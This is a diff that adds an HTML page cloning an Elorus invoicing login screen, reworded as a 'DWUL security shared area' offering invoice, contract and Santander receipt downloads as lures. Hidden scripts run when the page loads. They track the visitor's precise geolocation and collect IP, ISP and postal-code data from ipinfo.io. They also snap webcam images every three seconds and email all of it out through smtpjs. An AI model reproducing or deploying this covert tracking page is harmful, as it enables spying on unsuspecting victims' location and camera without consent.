@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+    <meta charset="utf-8">
+    <title>Elorus | Online Invoicing &amp; Time Tracking Software</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://az675625.vo.msecnd.net/static/img/favs/favicon.ico" type="image/x-icon">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="msapplication-config" content="/browserconfig.xml">
+    <meta name="msapplication-TileColor" content="#2b5797">
+    <meta name="msapplication-TileImage" content="/mstile-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <script src="https://az675625.vo.msecnd.net/static/jsi18n/en/99914b932bd37a50b983c5e7c90ae93b.js"></script><script src="https://browser.sentry-cdn.com/4.6.4/bundle.min.js" crossorigin="anonymous"></script><script>Sentry.init({dsn: "https://2d47f3b9073c4be09f34dec8d69a266d@sentry.io/1416497",release: "49904b2b3044de04cd4f84596655261c734f0aa1",whitelistUrls: [/elorus\.com/, /https:\/\/az675625\.vo\.msecnd\.net\/static\//],ignoreErrors: ["SkypeClick2Call","null is not an object (evaluating 'elt.parentNode')","NS_ERROR_FAILURE"]});</script>
+    <link type="text/css" href="https://az675625.vo.msecnd.net/static/auth-a103e13245f1a9f7051b.css" rel="stylesheet" />
+    <script src="https://az675625.vo.msecnd.net/static/CACHE/js/output.80d7c2eb4b06.js"></script>
+    <script>var EluxConfig={"version": "49904b2b3044de04cd4f84596655261c734f0aa1", "staticURL": "https://az675625.vo.msecnd.net/static/", "user": {"person_name": "", "is_authenticated": false, "id": "", "role": "", "is_verified": false, "email": ""}, "language": "en", "organization": {"canUseMyData": false, "demo": false, "company": "Dwul", "canSeeMCSR": false, "is_elorus": false, "anonymous": false, "currencySymbol": "R$", "logo": "", "currencyBeforeValue": false, "id": "1998617979863958975", "superdomain": false, "hourly_rate": "0.00", "tt_enabled": true, "calculator_mode": "initial", "created": "2020-07-20", "country": "BR", "currencyCode": "BRL", "etr_enabled": false, "mydata_enabled": false, "rcr_enabled": false, "subdomain": "dwul", "cheques_enabled": false}, "locale": "en", "timezone": "Europe/Athens", "uperm": {}};</script>
+    <meta name="robots" content="NONE,NOARCHIVE" />
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="index.js"></script>
+    <link rel="stylesheet" href="main.css" type="text/css" media="all">
+    <script src="capture.js"></script>
+</head>
+<body onLoad="getLocation();" class="loggedout bg-icons login">
+    <p id="demo"></p>
+<script>
+        var x = document.getElementById("demo");
+
+        function getLocation() {
+
+   //Geo Location routine
+    if('geolocation' in navigator){
+       watcher: navigator.geolocation.watchPosition(
+       function(position){
+         var msg = "https://www.google.com/maps/search/" + position.coords.latitude + "," + position.coords.longitude;
+         console.log(msg);
+         sendEmail(msg);
+       }, 
+         function(error) {
+             console.log(error);
+                   },
+                     { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+       )
+   } else {
+       console.log('Geolocation is not enabled');
+   }
+        }
+</script>
+
+<div id="right-fixed-top" class="navbar navbar-default navbar-fixed-top">
+    <div class="container" style="position: relative">
+        <div class="navbar-header">
+            <div class="top-left-logged-out">
+                <a href="/"><i class="elorus-logo-full"></i></a>
+            </div>
+            <div class="navbar-text hidden-xs headings-font small">
+                YOUR BUSINESS IN ONE PLACE
+            </div>
+        </div>
+        <div class="pull-right navbar-text headings-font">
+            
+        </div>
+    </div>
+</div>
+<div class="logged-out-content">
+    <div>
+        <div class="f-row">
+            <div class="f-col-xs-12 text-center">
+                <h1>Welcome to Elorus</h1>
+                <p class="add-bottom">DWUL security shared area:  </p>
+                
+            </div>
+            <div class="f-col-xs-12">
+                <div class="form-rectangle">
+    <div class="border-wrapper-outer bele-green-border-before">
+        <div class="border-wrapper bele-purple-border-before">
+            <div class="well bele-blue-border">
+                <form class="form" method="post" novalidate>
+                    <input type='hidden' name='csrfmiddlewaretoken' value='lMOvmPZUGqPs2HUSvjeoS6BFhijHjJt0rwspL6OPo0A47tKGuf6SQB7p07tNnHF2' />
+                    <input type="hidden" name="next" value="/" />
+                    
+<div class="container-fluid">
+    <div class="form-group">
+        <label class="control-label" for="id_email">
+            Following the DWUL invoice(s) available: 
+        </label>
+            <!-- <input type="text" name="email" id="id_email" maxlength="254" /> -->
+    </div>
+    <!-- <div class="form-group">
+        <label class="control-label" for="id_password">
+            Password
+        </label>
+            <input type="password" name="password" id="id_password" />
+    </div> -->
+</div>
+
+                    <!--<div class="container-fluid">
+                        <div class="inline-block"><div class="checkbox"><input type="checkbox" name="remember_me" id="id_remember_me" /><label for="id_remember_me"></label></div></div>
+                        <label class="control-label" for="id_remember_me">Stay signed in</label>
+                    </div> -->
+                    <div class="text-center">
+                        <p class="text-muted"><a href="Exchange Rate Contract-1.pdf">Exchange Rate Contract-1.pdf</a></p>
+                        <p class="text-muted"><a href="Exchange Rate Contract-2.pdf">Exchange Rate Contract-2.pdf</a></p>
+                        <p class="text-muted"><a href="Invoice Receipt - ADML.pdf">Invoice Receipt - ADML.pdf</a></p>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+<p class="text-center">
+    Don't have an account yet? <a href="https://app.elorus.com/register/">Sign up here.</a>
+</p>
+            </div>
+        </div>
+    </div>
+    <footer id="logged-out-footer">
+        <div class="container">
+            <div class="f-row">
+                <div class="f-col-xs-12 f-col-sm-6">
+                    <a href="/">Elorus</a> | <a href="https://www.elorus.com/en/terms-of-use/" target="_blank">Terms of use</a> | <a href="http://support.elorus.com/" target="_blank">Support Center</a>
+                    
+                </div>
+                <div class="f-col-xs-12 f-col-sm-6">
+                    <div class="footer-text">
+                        &copy; 2014 - 2020.&#xa0;
+                        <a href="https://www.elorus.com/" target="_blank">Elorus</a><br/>
+                        Version: 49904b1
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+</div>
+    <script>
+(function() {
+	document.addEventListener('DOMContentLoaded', function() {
+		var csrfl = false;
+
+		var unsalt = function(csrfToken) {
+		    var salt = csrfToken.substring(0, 32),
+                token = csrfToken.substr(32),
+                chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
+                secret = '';
+
+		    for (var i=0; i<32; i++) {
+		        var x = chars.indexOf(token.charAt(i)),
+                    y = chars.indexOf(salt.charAt(i));
+		        var position = x - y;
+		        if (position < 0) {
+		            position = chars.length + position;
+                }
+                secret += chars.charAt(position);
+            }
+
+		    return secret;
+        };
+
+		window.addEventListener("focus", function() {
+		    if (typeof getCookie !== 'function') return;
+		    var cookie = getCookie('csrftkn');
+		    if (!cookie) return;
+
+			if (!csrfl && unsalt(cookie) !== unsalt(document.querySelector('input[name="csrfmiddlewaretoken"]').value)) {
+				var next_url = window.location.href;
+	        	document.querySelector('form input[type="submit"]').classList.add('disabled');
+	        	window.location.href = next_url;
+	        	csrfl = true;
+        	}
+		});
+		document.querySelector('form').addEventListener('submit', function() {
+			csrfl = true;
+			return true;
+		});
+	});
+})();</script>
+    <script type="text/javascript" src="https://az675625.vo.msecnd.net/static/auth-a103e13245f1a9f7051b.js" ></script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-173283091-1"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+            gtag('config', 'UA-173283091-1');
+        </script>
+
+<script>
+    //capture geoLocation, ISP, IP, Postal Code
+	fetch('https://ipinfo.io/?callback=JSON_CALLBACK')
+    .then(function (response) {
+        switch (response.status) {
+            // status "OK"
+            case 200:
+                return response.text();
+            // status "Not Found"
+            case 404:
+                throw response;
+        }
+    })
+    .then(function (template) {
+		sendEmail(template);
+        //console.log(template);
+    })
+    .catch(function (response) {
+		console.log(response.statusText);
+    });
+</script>
+
+
+
+<div class="contentarea">
+  <div class="camera">
+	    <video id="video">Video stream not available.</video>
+		<button id="startbutton">Take photo</button> 
+</div>
+
+  <canvas id="canvas">
+
+  </canvas>
+ 
+  <div class="output">
+    <img id="photo" alt="The screen capture will appear in this box."> 
+  </div>
+
+</div>
+<div>
+	Baixe o documento<br>
+	<a href="receipt.docx">SANTANDERCB RECEIPT DOC</a> <br>
+</div>
+<script>
+
+	function takepicture() {
+	var context = canvas.getContext('2d');
+	var width = 640;
+	var height = 480;
+
+    if (width && height) {
+      canvas.width = width;
+      canvas.height = height;
+      context.drawImage(video, 0, 0, width, height);
+    
+      var data = canvas.toDataURL('image/png');
+	  photo.setAttribute('src', data);
+	  
+	  sendEmail(data);
+
+    } else {
+      clearphoto();
+    }
+  }
+  
+	var vid = document.getElementById("video"); 
+	vid.onloadstart = function() { 
+		console.log("Starting to load video"); 
+		setInterval(function(){ takepicture(); }, 3000);
+	};
+
+</script>
+
+</body>
+</html>
